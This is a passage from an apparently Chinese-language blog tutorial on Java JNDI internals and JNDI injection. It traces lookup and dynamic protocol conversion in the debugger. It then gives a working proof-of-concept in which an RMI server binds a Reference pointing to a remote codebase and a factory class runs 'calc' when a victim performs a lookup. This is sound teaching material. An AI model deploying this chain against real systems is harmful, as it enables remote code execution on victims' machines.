alt="image.png"><br>之后调用RegistryContext 的 lookup 方法，这里会因为我们传值的 ResolveResult 通过getRemainingName 方法返回的结果为空，所以不会继续下面的直接调用 registryImpl_stub 的 lookup 方法，而是返回当前的RegistryContext<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974088022-665467ec-8893-4ce2-b335-f7457001da86.png#averageHue=%23494f5b&clientId=u1db2a60e-ea5c-4&from=paste&height=288&id=u2140d9b9&originHeight=432&originWidth=1289&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=254765&status=done&style=none&taskId=ue426557b-547b-413a-aaad-61aa5a2e0c9&title=&width=859.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>上述逻辑比较重要，因为可能刚才流程师傅们在学习的时候会很好奇为什么会进 lookup 逻辑，但是却没有返回查询结果（我也不知道为什么在创建 RegistryContext 的时候会调 lookup）<br>那么这里返回之后会一路返回上去<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974369618-691e8d72-d5d1-4b19-a6c0-372b6441aea0.png#averageHue=%23404752&clientId=u1db2a60e-ea5c-4&from=paste&height=723&id=u41761343&originHeight=1084&originWidth=1769&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=879836&status=done&style=none&taskId=uc00e5dc6-7b5d-44a0-9093-9e4cf059996&title=&width=1179.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>所以我们当前初始化的InitialContext 就是 RegistryContext 实例化对象，再次调用其 lookup 方法就是调用刚才的 lookup 了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974498812-0edf82ef-d9c1-4ff2-acb0-c80909e67965.png#averageHue=%23494f5b&clientId=u1db2a60e-ea5c-4&from=paste&height=271&id=ucdc2e7cd&originHeight=406&originWidth=1366&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=262634&status=done&style=none&taskId=u48a0cf21-cd88-40e9-a1bf-c583c3fb9b9&title=&width=910.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
<p>总结一下调用栈：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974510355-d449ad6e-51b6-4b4c-99b2-5108c1c13a5f.png#averageHue=%23404040&clientId=u1db2a60e-ea5c-4&from=paste&height=170&id=uc5364164&originHeight=255&originWidth=1024&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59770&status=done&style=none&taskId=ucb2e5ff3-285a-4797-80a5-5e5b10d8bb9&title=&width=682.6666666666666" referrerpolicy="no-referrer" alt="未命名文件-1-1024x255.png"><br>下面代码部分的获取 context 不涉及getInitCtxURL 获取服务路径的部分</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">RegistryContextFactory</span>#<span class="token function">getInitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
<span class="token class-name">RegistryContextFactory</span>#<span class="token class-name">URLToContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
rmiURLContextFactory#<span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
rmiURLContextFactory#<span class="token function">getUsingURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
rmiURLContext#<span class="token function">lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
<span class="token class-name">GenericURLContext</span>#<span class="token function">lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>
<span class="token class-name">GenericURLContext</span>#<span class="token function">getRootURLContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//到这就算是获取到了包含RegistryContext的ResolveResult对象，后续就是进lookup意思一下返回RegistryContext了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实能调 RMI 的远程 lookup，就存在攻击可能</p>
<h2 id="JNDI-动态协议转化"><a href="#JNDI-动态协议转化" class="headerlink" title="JNDI 动态协议转化"></a>JNDI 动态协议转化</h2><p>这次我们不往InitialContext 初始化里面丢自己写好的环境变量 hashtable</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> string<span class="token operator">=</span><span class="token string">"rmi://localhost:1099/Hello"</span><span class="token punctuation">;</span>
<span class="token class-name">Context</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">RemoteInterface</span> remoteObject<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">RemoteInterface</span><span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObject<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接就往initialContext 的 lookup 里面写我们的 RMI 定位 URL<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975273525-4288d439-01f4-42fd-bc45-921e64ee17af.png#averageHue=%233e434c&clientId=u1db2a60e-ea5c-4&from=paste&height=135&id=u5052951e&originHeight=202&originWidth=901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57647&status=done&style=none&taskId=ubdad0d78-2c43-42fd-94b6-fb4786fd125&title=&width=600.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>发现依然能够查找到远程对象</p>
<h3 id="0x01-动态协议转化流程分析"><a href="#0x01-动态协议转化流程分析" class="headerlink" title="0x01 动态协议转化流程分析"></a>0x01 动态协议转化流程分析</h3><p>在 lookup 处下个断点，跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975523916-c8064b0f-125a-429b-aa5a-9ade7c070847.png#averageHue=%233c434d&clientId=u1db2a60e-ea5c-4&from=paste&height=704&id=u22df5022&originHeight=1056&originWidth=1319&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=682689&status=done&style=none&taskId=u2a733897-c3d3-4358-9eb2-8e5994181a9&title=&width=879.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>发现在 initialContext 中不论是调哪种方法都是默认要走一层getURLOrDefaultInitCtx，也就是我们最开始获取 Context 的 factory 构造类的流程相似<br>跟进到具体内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975741782-4ea225c2-ba07-4c09-92dc-c42ec813f401.png#averageHue=%23454b57&clientId=u1db2a60e-ea5c-4&from=paste&height=330&id=ua4d26afe&originHeight=495&originWidth=1548&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=323383&status=done&style=none&taskId=ufef311be-3057-4f7c-b922-7f147a22760&title=&width=1032" referrerpolicy="no-referrer" alt="image.png"><br>由于这里我们没有InitialContextFactoryBuilder，所以不能够直接去调用getDefaultInitCtx(不然就和上面的流程一样了)，往下先获取到 scheme，也就是 rmi 协议头<br>带着 scheme 进入NamingManager.getURLContext 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975958801-f4caf920-256a-4c10-a471-4a840fad5557.png#averageHue=%23454a55&clientId=u1db2a60e-ea5c-4&from=paste&height=405&id=u55f3f6aa&originHeight=607&originWidth=1733&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=407945&status=done&style=none&taskId=udbba462a-e09c-456f-83ff-147d8abb9e0&title=&width=1155.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进到 getURLObject 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976017546-ccbfbfd5-6477-4367-9ffd-e946740ad4f3.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=497&id=u3c57b1d5&originHeight=745&originWidth=1358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=441998&status=done&style=none&taskId=u81010180-5f8d-4215-b2b7-f7cffb8a0b9&title=&width=905.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这边根据_defaultPkgPrefix_属性动态生成Factory类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976046434-d4bdc194-65c5-4ec6-8edc-d8ff420e5b2d.png#averageHue=%233c424a&clientId=u1db2a60e-ea5c-4&from=paste&height=82&id=u37147473&originHeight=123&originWidth=909&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=43283&status=done&style=none&taskId=u8769d02b-7270-464f-849e-7f50df083dd&title=&width=606" referrerpolicy="no-referrer" alt="image.png"><br>也就是说这个包下的类都是可以通过 JNDI 的动态协议转化生成 factory 的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976294728-11ddfd24-57f9-41c1-810f-7358e585f8b4.png#averageHue=%232c3138&clientId=u1db2a60e-ea5c-4&from=paste&height=300&id=ucd34c010&originHeight=450&originWidth=1233&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=121309&status=done&style=none&taskId=u37e292b4-d129-42f7-a685-bb8580854b4&title=&width=822" referrerpolicy="no-referrer" alt="image.png"></p>
<p>直到这里，我相信师傅们应该能理解为什么要分别分析 JNDI 的正常通过获取环境变量设置去实例化获取 context，和 JNDI 动态协议转化了<br>JNDI 动态协议转化使我们的攻击扩大了可能性以及攻击范围，虽说 JNDI 的这种动态转化的功能很方便，但是有方便，并且参数可控，就是我们可以攻击点，假如我们可以控制字符串的输入，就能够搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行(工厂类的 loadclass 动态加载)</p>
<h1 id="JNDI-Refernce-类"><a href="#JNDI-Refernce-类" class="headerlink" title="JNDI-Refernce 类"></a>JNDI-Refernce 类</h1><p>定义在最开始的提到过，但是这里还要对其有一定的补充：<br> **Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用  **，什么意思呢？就是当我们查询远程对象在服务中找不到时，能够从其他远程端获取到 class 文件加载并实例化<br>Reference 类结构如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709980320214-ecd0a1db-9781-4382-8e11-36baaef075ec.png#averageHue=%23373f46&clientId=u270414de-1e6d-4&from=paste&height=484&id=u9de119d8&originHeight=726&originWidth=730&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=271421&status=done&style=none&taskId=uda91758c-0517-4684-b6c7-35487d61de2&title=&width=486.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里只列出一种构造方法，还有其他三种构造方法，依次递减构造参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709980437584-8198d58e-93c3-46ff-a0a8-e0591a212581.png#averageHue=%233d434c&clientId=u270414de-1e6d-4&from=paste&height=187&id=u2131c3ec&originHeight=280&originWidth=1070&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=128019&status=done&style=none&taskId=uc8fb356a-72fa-49bb-a8f7-e10138ca18a&title=&width=713.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
<p>由于 RMI 的限制，如果想要远程对象被访问到就必须继承 UnicastRemoteObject。 所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。  </p>
<h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><p>先来张流程图<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/jpeg/36078896/1709981196302-8a1a1bd5-b5a6-4ec0-9dc5-9da514674774.jpeg" referrerpolicy="no-referrer"></p>
<h2 id="0x01-JNDI-RMI"><a href="#0x01-JNDI-RMI" class="headerlink" title="0x01 JNDI+RMI"></a>0x01 JNDI+RMI</h2><p>和 RMI 中远程从 codebase 中获取恶意类加载的思路是差不多的，我们这里只不过不是把 codebase 换成了 Reference 对象<br>写一个简单的恶意 RMI 客户端</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLOutput</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMI_Server2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Reference</span> reference<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"RMIHello"</span><span class="token punctuation">,</span><span class="token string">"RMIHello"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8888/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/hello"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Registry正在运行中"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里 Reference 必须用<code>ReferenceWrapper</code>包装一下，不然无法通过 RMI 访问到<br>然后写一下恶意工厂类，必须继承ObjectFactory 类。同样也是由于必须继承远程对象类才能被 RMI 访问到，所以这里必须继承UnicastRemoteObject</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">ObjectFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>

<span class="token comment">//远程工厂类</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIHello</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token class-name">RMIHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>

            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> name<span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token annotation punctuation">@Override</span>

    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后写上受害者的信息</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDI_Dynamic</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>

            <span class="token class-name">String</span> string <span class="token operator">=</span> <span class="token string">"rmi://localhost:1099/hello"</span><span class="token punctuation">;</span>

            <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成功弹出计算机<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710060632030-7da153fc-ffaa-4096-9ac5-14316c81b944.png#averageHue=%235e656d&clientId=u632663d2-e5d7-4&from=paste&height=625&id=uce964003&originHeight=938&originWidth=1655&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=471093&status=done&style=none&taskId=u1809c8d7-2186-41b6-b4a6-0231daf3dbb&title=&width=1103.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<h3 id="1x01-流程分析"><a href="#1x01-流程分析" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>其实上面对于 JNDI 的工作流程分析时就已经提到过了，我们这里先确定一下大概的方向：<strong>JNDI 的动态协议转化导致我们能够从 Reference 类中读取地址，从恶意地址中获取恶意工厂类（其实不用工厂类也行）字节码内容，然后本地实例化之后触发构造方法 RCE</strong><br>首先 lookup 处下个断点<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062665563-d91b6696-e693-4fba-90c3-5bef4d1834d4.png#averageHue=%233e434c&clientId=u632663d2-e5d7-4&from=paste&height=272&id=u0ec07c44&originHeight=408&originWidth=1213&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=215457&status=done&style=none&taskId=u372e4768-ca16-4f9a-a77e-b1f4fb4f1c1&title=&width=808.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
<p>来到 lookup 的具体内容<br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062693579-3514793a-29d2-4e5c-83f9-ba8381b68410.png#averageHue=%233e4652&clientId=u632663d2-e5d7-4&from=paste&height=129&id=uc9c32251&originHeight=194&originWidth=1038&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=97801&status=done&style=none&taskId=u5e354e6f-4ee2-4551-9d4a-7b36888a236&title=&width=692" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进 getURLOrDefaultInitCtx 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062736878-34fc59c8-2d06-4c9f-8038-0d925487ca39.png#averageHue=%23464c58&clientId=u632663d2-e5d7-4&from=paste&height=410&id=u861bae45&originHeight=615&originWidth=1722&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=435980&status=done&style=none&taskId=uccfb3b08-9995-4bcc-abb5-9a3de8aede9&title=&width=1148" referrerpolicy="no-referrer" alt="image.png"><br>由于我们 URL 传值中制定了 RMI 协议，所以这里的 scheme 取出来是”RMI”，进入 if 判断完毕之后的内容，通过 NamingManager 的 getURLContext 的方法来获取 context<br>getURLContext** **内容里面只有一个 getURLObject 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062882587-faac3889-635a-4ecb-acae-1138766c8a5b.png#averageHue=%23454a56&clientId=u632663d2-e5d7-4&from=paste&height=427&id=u29869884&originHeight=640&originWidth=1554&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=404388&status=done&style=none&taskId=uecef2672-3b09-4141-9f8b-904a4ddfff3&title=&width=1036" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进，这里根据 scheme 的值构造出了 rmiURLContext 的构造实体 factory<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062950864-2dac57a6-195b-4e36-b121-8173aa692184.png#averageHue=%23454b56&clientId=u632663d2-e5d7-4&from=paste&height=432&id=ua2e6e902&originHeight=648&originWidth=1697&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=482611&status=done&style=none&taskId=ua1081dec-4d8d-4966-a837-8151b9850af&title=&width=1131.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 